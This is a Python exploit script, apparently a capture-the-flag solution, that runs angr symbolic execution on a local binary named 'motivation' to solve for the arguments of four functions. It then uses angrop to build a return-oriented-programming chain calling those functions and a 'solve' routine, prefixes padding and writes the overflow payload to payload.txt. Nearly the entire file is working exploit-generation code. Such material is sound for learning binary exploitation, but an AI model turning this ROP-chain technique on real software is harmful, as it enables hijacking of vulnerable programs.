import angr
import angrop
import claripy
import os

GADGET_CACHE = "./gadgets"

binary = "./motivation"

'''
    func0
'''
p = angr.Project(binary)

sym_edi = claripy.BVS('sym_edi', 8*4)
sym_esi = claripy.BVS('sym_esi', 8*4)
sym_edx = claripy.BVS('sym_edx', 8*4)

func0_args  = [ 0, 0, 0 ]
start_addr  = 0x0040122c # Start of func0
find_addr   = 0x004012d5 # func0 return
avoid_addr  = None

state = p.factory.blank_state(
        addr=start_addr,
)

state.regs.edi = sym_edi
state.regs.esi = sym_esi
state.regs.edx = sym_edx

state.add_constraints((sym_edi + sym_esi) * sym_edx != 0x1000)
state.add_constraints(0x1000 >= sym_edx >> 2)
state.add_constraints(sym_esi * 4 >= 0x1000)
state.add_constraints(0 >= sym_edi - sym_edx)
state.add_constraints(sym_edx + sym_esi >= sym_edi)
state.add_constraints(sym_edi != 0)
state.add_constraints(sym_esi != 0)
state.add_constraints(sym_edx != 0)

sim = p.factory.simgr(
        state,
        save_unconstrained=True,
)

sim.explore(
        find=find_addr,
        avoid=avoid_addr,
)

if sim.unconstrained:
    s = sim.unconstrained[0]
    func0_args[0] = s.solver.eval(sym_edi)
    func0_args[1] = s.solver.eval(sym_esi)
    func0_args[2] = s.solver.eval(sym_edx)
    print("UNCONSTRAINED func0 args")
    #print(' '.join(func0_args))
else:
    print("NO func0 UNCONSTRAINED")

#if sim.found:
#    s = sim.found[0]
#    func0_args[0] = s.solver.eval(sym_edi)
#    func0_args[1] = s.solver.eval(sym_esi)
#    func0_args[2] = s.solver.eval(sym_edx)
#    print("FOUND func0 args")
#    #print(' '.join(func0_args))
#else:
#    print("NO func0 FOUND")

'''
    func1
'''

p = angr.Project(binary)

sym_edi = claripy.BVS('sym_edi', 8*4)
sym_esi = claripy.BVS('sym_esi', 8*4)

func1_args  = [ 0, 0 ]
start_addr  = 0x004012d6 # Start of func1
find_addr   = 0x00401344
avoid_addr  = None

state = p.factory.blank_state(
        addr=start_addr,
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
        },
)

state.regs.edi = sym_edi
state.regs.esi = sym_esi

state.add_constraints(sym_esi >= sym_edi)
state.add_constraints(sym_edi * sym_esi >= 1024)
state.add_constraints(0x190 >= sym_esi + sym_edi)
state.add_constraints(sym_edi != 0)
state.add_constraints(sym_esi != 0)

sim = p.factory.simgr(
        state,
        save_unconstrained=True,
)

sim.explore(
        find=find_addr,
        avoid=avoid_addr,
)

if sim.unconstrained:
    s = sim.unconstrained[0]
    func1_args[0] = s.solver.eval(sym_edi)
    func1_args[1] = s.solver.eval(sym_esi)
    print("UNCONSTRAINED func1 args")
    #print(' '.join(func1_args))
else:
    print("NO UNCONSTRAINEDS")

#if sim.found:
#    s = sim.found[0]
#    func1_args[0] = s.solver.eval(sym_edi)
#    func1_args[1] = s.solver.eval(sym_esi)
#    print("FOUND func1 args")
#    #print(' '.join(func1_args))
#else:
#    print("NO FOUNDS")

'''
    func2
'''

p = angr.Project(binary)

sym_edi = claripy.BVS('sym_edi', 8*4)

func2_args  = [ 0 ]
start_addr  = 0x00401345 # Start of func2
find_addr   = 0x004013a9
avoid_addr  = None

state = p.factory.blank_state(
        addr=start_addr,
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
        },
)

state.regs.edi = sym_edi

state.add_constraints(sym_edi >= 0xff000000)
state.add_constraints(sym_edi >> 4 & 0xf0f0f0f >= 0xf0f0f0f)
state.add_constraints(sym_edi - 2 & 2 != 0)
state.add_constraints(sym_edi & 1 == 0)
state.add_constraints(sym_edi != 0)

sim = p.factory.simgr(
        state,
        save_unconstrained=True,
)

sim.explore(
        find=find_addr,
        avoid=None,
)

#if sim.unconstrained:
#    s = sim.unconstrained[0]
#    func2_args[0] = s.solver.eval(sym_edi)
#    print("UNCONSTRAINED func2 args")
#    print(' '.join(func2_args))
#else:
#    print("NO UNCONSTRAINEDS")

if sim.found:
    s = sim.found[0]
    func2_args[0] = s.solver.eval(sym_edi)
    print("FOUND func2 args")
    print(func2_args)
else:
    print("NO FOUNDS")

'''
    func3
'''

p = angr.Project(binary)

sym_edi = claripy.BVS('sym_edi', 8*4)
sym_esi = claripy.BVS('sym_esi', 8*4)
sym_edx = claripy.BVS('sym_edx', 8*4)

func3_args  = [ 0, 0, 0 ]
start_addr  = 0x004013aa # Start of func1
find_addr   = 0x0040142d
avoid_addr  = None

state = p.factory.blank_state(
        addr=start_addr,
        add_options={
            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
        },
)

state.regs.edi = sym_edi
state.regs.esi = sym_esi
state.regs.edx = sym_edx

state.add_constraints((sym_edx + ((sym_edi * sym_edx >> (sym_edi & 0x1f)) - sym_esi)) * sym_edi >= (sym_edx + (sym_edi << (sym_esi & 0x1f))) * 0x20)
state.add_constraints(sym_edi != 0)
state.add_constraints(sym_esi != 0)
state.add_constraints(sym_edx != 0)

sim = p.factory.simgr(
        state,
        save_unconstrained=True,
)

sim.explore(
        find=find_addr,
        avoid=None,
)

if sim.unconstrained:
    s = sim.unconstrained[0]
    func3_args[0] = s.solver.eval(sym_edi)
    func3_args[1] = s.solver.eval(sym_esi)
    func3_args[2] = s.solver.eval(sym_edx)
    print("UNCONSTRAINED func3 args")
    #print(' '.join(func3_args))
else:
    print("NO UNCONSTRAINEDS")

if sim.found:
    s = sim.found[0]
    func3_args[0] = s.solver.eval(sym_edi)
    func3_args[1] = s.solver.eval(sym_esi)
    func3_args[2] = s.solver.eval(sym_edx)
    print("FOUND func3 args")
    #print(' '.join(func3_args))
else:
    print("NO FOUNDS")

rop = p.analyses.ROP()
gadgets = rop.find_gadgets()

payload = b''
padding = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
chain = rop.func_call("func0", func0_args) +\
        rop.func_call("func1", func1_args) +\
        rop.func_call("func2", func2_args) +\
        rop.func_call("func3", func3_args) +\
        rop.func_call("solve", [])
payload += padding
payload += chain.payload_str()

with open("payload.txt", "wb") as file:
    file.write(payload)
